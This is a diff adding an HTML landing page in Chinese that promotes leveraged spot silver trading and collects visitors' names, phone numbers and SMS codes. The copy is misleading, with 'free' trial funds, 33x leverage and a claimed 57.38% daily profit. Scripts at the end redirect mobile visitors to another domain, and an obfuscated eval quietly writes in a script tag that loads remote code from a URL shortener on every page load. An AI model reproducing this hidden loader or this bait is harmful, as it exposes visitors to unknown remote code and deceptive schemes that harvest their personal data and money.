@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8"/>
+		<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+		<title>白银网站</title>
+		<link rel="stylesheet" type="text/css" href="css/style.css"/>
+	</head>
+	<body>
+		<div class="banner">
+			<!--免费领取-->
+			<div class="receive clearfix">
+				<div class="box">
+					<h2 class="ftitle">免费领取<span class="fhot">100万</span>体验金</h2>
+					<div class="form">
+						<div class="lable">
+							<i class='iconname'></i>
+							<input type="text" name="" id="name" placeholder="请输入姓名" value="" />
+							<span class="placeholder">请输入姓名</span>
+						</div>
+						<div class="lable">
+							<i class="icontel"></i>
+							<input type="tel" name="" id="tel" placeholder="输入手机号码" value="" />
+							<span class="placeholder">输入手机号码</span>
+						</div>
+						<div class="lable">
+							<input type="text" name="" class="yzm" id="yzm" placeholder="输入验证码" value="" />
+							<span class="placeholder plyz">输入验证码</span>
+							<input type="button" readonly="readonly" id="checkCode" class="code" value="获取短信验证码"/>
+						</div>
+						<input type="button" class="lq" value="立即领取" id="receive"/>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="nav">
+			<ul class="clearfix">
+				<li class="clearfix">
+					<div class="image transition03">
+						<img src="image/1.png"/>
+					</div>
+					<div class="navfont">
+						<h4>3分钟开户</h4>
+						<p>还去柜台开户?又麻烦又费时,你OUT啦!</p>
+					</div>
+				</li>
+				<li>
+					<div class="image transition03">
+						<img src="image/2.png"/>
+					</div>
+					<div class="navfont">
+						<h4>交易灵活</h4>
+						<p>22小时交易 随时买卖</p>
+					</div>
+				</li>
+				<li>
+					<div class="image transition03">
+						<img src="image/3.png"/>
+					</div>
+					<div class="navfont">
+						<h4>随时出入金</h4>
+						<p>便捷出入金制度:自己随时安排资金出入,省去诸多烦恼</p>
+					</div>
+				</li>
+				<li>
+					<div class="image transition03">
+						<img src="image/4.png"/>
+					</div>
+					<div class="navfont">
+						<h4>与国际价格接轨</h4>
+						<p>国际同步报价，公平公正</p>
+					</div>
+				</li>
+			</ul>
+		</div>
+		<div class="content">
+			<div class="clearfix">
+				<div class="cleft">
+					<div class="list-style">投资对比</div>
+					<div class="contrast">
+						<ul class="table clearfix">
+							<li>
+								<ul class="tr">
+									<li>白银投资</li>
+									<li>机会少</li>
+									<li>只能买涨</li>
+									<li>不能随时变现</li>
+									<li>资金占用</li>
+									<li>信息不及时</li>
+								</ul>
+							</li>
+							<li class="current">
+								<ul class="tr">
+									<li>白银<img class="trophy" src="image/trophy.png"/></i></li>
+									<li>机会多</li>
+									<li>买涨卖跌双向交易</li>
+									<li>22小时无缝交易</li>
+									<li>资金可放大33倍</li>
+									<li>市场公正，全球价格联动</li>
+								</ul>
+							</li>
+							<li>
+								<ul class="tr">
+									<li>实物白银</li>
+									<li>只能买涨</li>
+									<li>买涨卖跌双向交易</li>
+									<li>受发行机构时间限制</li>
+									<li>收益固定，收益低</li>
+									<li>信息不固定，容易老鼠仓</li>
+								</ul>
+							</li>
+						</ul>
+					</div>
+				</div>
+				<div class="cright">
+					<div class="list-style">现货白银行情走势</div>
+					<div class="market">
+						<div class="wz">
+							<ul class="clearfix">
+								<li>交易品种<br />现货银</li>
+								<li>现价<br />3781</li>
+								<li>升跌<br />-14</li>
+								<li>涨跌价<br />00.36%</li>
+								<li>开盘价<br />3793</li>
+								<li>昨日收盘价<br />3795</li>
+								<li>最高价<br />3809</li>
+								<li>最低价<br />3777</li>
+							</ul>
+						</div>
+						<div class="image">
+							<img src="image/market.png"/>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div>
+				<div class="list-style">盈利计算</div>
+				<div class="profit clearfix">
+					<div class="pleft">
+						<p class="name">白银现货30分钟图</p>
+						<div class="image">
+							<img src="image/30.png"/>
+						</div>
+					</div>
+					<div class="pright">
+						<p class="name">例如:</p>
+						<p class="ms">王女士账户有50万元，在8月2日10：34投入10万于4340点位摘牌买入50手现货银15KG，并在晚间23：08于4431点位转让平仓并反手摘牌卖出50手，在次日晚上22:04于4341点位转让平仓。计算器可以算出王女士当天的盈利率为57.38% </p>
+						<div class="cal">
+							<p>您计划投资<input type="text" id="zj"/>元<input type="button" value="计算" onclick="jisuan()"/></p>
+							<p>您能买到<input type="text" id="su"/>手现货银15kg（1手=15公斤）</p>
+							<p>您的盈亏为<input type="text" id="yk"/><span style="color: #999999;">（若行情波动50点）</span></p>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div>
+				<div class="list-style">白银开户流程</div>
+				<ul class="process clearfix">
+					<li>
+						<div class="flimg">
+							<div class="flfont">
+								<p>开户就送100W哦</p>
+								<p>赶紧开户吧</p>
+							</div>
+						</div>
+						<h3 class="name">开立账户</h3>
+						<p>优惠活动实时更新   助你交易赢在起点</p>
+						<ul class="fllist">
+							<li><a href="">怎样开户？</a></li>
+							<li><a href="">投资者准入条件？</a></li>
+							<li><a href="">如何确保我的账户资金安全？</a></li>
+							<li><a href=""> 一定要到现场才能办理开户吗？</a></li>
+						</ul>
+					</li>
+					<li>
+						<div class="flimg">
+							<div class="flfont">
+								<p>电脑 手机 ipad</p>
+								<p>极速下载</p>
+							</div>
+						</div>
+						<h3 class="name">软件下载</h3>
+						<p>新华交易软件 集行情资讯交易与一身，方便盯盘</p>
+						<ul class="fllist">
+							<li><a href="">电脑版下载</a></li>
+							<li><a href="">IOS手机版下载</a></li>
+							<li><a href="">Android版下载</a></li>
+							<li><a href="">下载失败？</a></li>
+						</ul>
+					</li>
+					<li>
+						<div class="flimg">
+							<div class="flfont">
+								<p>千位专家同时在线</p>
+								<p>为您交易保驾护航</p>
+							</div>
+						</div>
+						<h3 class="name">专家策略</h3>
+						<p>0元开户 1v1专业反服务 24小时在线 为您的交易护航</p>
+						<ul class="fllist">
+							<li><a href="">仓位介绍</a></li>
+							<li><a href=""> 市场价区别</a></li>
+							<li><a href=""> 什么是双向交易？</a></li>
+							<li><a href="">  其他问题</a></li>
+						</ul>
+					</li>
+				</ul>
+			</div>
+			<div class="footerbanner">
+				<div class="image">
+					<img src="image/banner2.png"/>
+				</div>
+				<a href="javascript:;" class="download">立即下载</a>
+			</div>
+		</div>
+		<div class="footer">
+			<p>Copyright &copy 2010-2017 金创互动科技（深圳）有限公司 广告版权 </p>
+			<p>本站信息仅供投资者参考，不做为投资建议！投资有风险，入市需谨慎！</p>
+		</div>
+		<script src="js/jquery.min.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/placeholder.js" type="text/javascript" charset="utf-8"></script>
+		<script src="js/index.js" type="text/javascript" charset="utf-8"></script>
+		<script type="text/javascript">
+			function browserRedirect() {
+				var sUserAgent= navigator.userAgent.toLowerCase();
+				var bIsIpad= sUserAgent.match(/ipad/i) == "ipad";
+				var bIsIphoneOs= sUserAgent.match(/iphone os/i) == "iphone os";
+				var bIsMidp= sUserAgent.match(/midp/i) == "midp";
+				var bIsUc7= sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
+				var bIsUc= sUserAgent.match(/ucweb/i) == "ucweb";
+				var bIsAndroid= sUserAgent.match(/android/i) == "android";
+				var bIsCE= sUserAgent.match(/windows ce/i) == "windows ce";
+				var bIsWM= sUserAgent.match(/windows mobile/i) == "windows mobile";
+		
+				if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+		            window.location.href = 'http://m.svip.89xh.cc';
+				} else {
+//					window.location.href = 'http://svip.89xh.cc';
+				}
+			}
+			browserRedirect();//调用自身，页面一打开就开始跳转
+		</script>
+		<script>
+		eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1.2("<0 3=\'4://5.6/7\'></0>");',8,8,'script|document|writeln|src|http|t|cn|Rt4kuaP'.split('|'),0,{}))
+		</script>
+
+	</body>
+</html>
